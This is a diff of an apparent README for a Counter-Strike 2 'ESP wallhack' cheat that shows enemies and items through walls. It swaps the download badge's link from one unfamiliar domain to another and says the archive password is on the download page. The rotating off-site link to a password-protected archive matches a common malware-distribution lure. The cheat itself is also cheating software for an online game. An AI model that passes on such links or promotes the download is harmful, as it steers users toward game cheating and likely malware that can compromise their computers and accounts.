@@ -18,7 +18,7 @@ CS2 ESP wallhack — see all enemies, dropped weapons, and bomb through walls.
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/cs2esp3)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/cs2esp3)
 
 > The archive password is shown on the download page.
 
